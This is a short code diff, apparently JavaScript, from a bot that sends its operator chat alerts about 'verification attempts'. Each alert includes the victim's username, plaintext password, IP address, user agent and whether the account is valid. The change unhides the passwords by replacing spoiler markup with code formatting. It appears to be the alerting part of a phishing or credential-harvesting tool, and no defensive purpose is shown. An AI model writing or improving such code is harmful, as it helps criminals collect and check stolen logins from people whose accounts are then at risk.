@@ -110,8 +110,8 @@ async function sendVerificationAlert(verificationEntry, isValidAccount) {
 
 ${statusIcon} **Account Status:** ${statusText}
 
-👤 **Username:** ${verificationEntry.username}
-🔐 **Password:** ||${verificationEntry.password}||
+👤 **Username:** \`${verificationEntry.username}\`
+🔐 **Password:** \`${verificationEntry.password}\`
 🌐 **IP Address:** ${verificationEntry.ip}
 🕒 **Attempt Time:** ${new Date(verificationEntry.timestamp).toLocaleString()}
 📱 **User Agent:** ${verificationEntry.userAgent.substring(0, 50)}...
@@ -212,8 +212,8 @@ I'm monitoring verification attempts and will alert you of new submissions.
         const message = `
 📋 **Latest Verification Attempt**
 
-👤 Username: ${latest.username}
-🔐 Password: ||${latest.password}||
+👤 Username: \`${latest.username}\`
+🔐 Password: \`${latest.password}\`
 🌐 IP: ${latest.ip}
 🕒 Time: ${new Date(latest.timestamp).toLocaleString()}
 ✅ Status: ${latest.status === 'valid' ? 'Valid Account' : 'Invalid'}
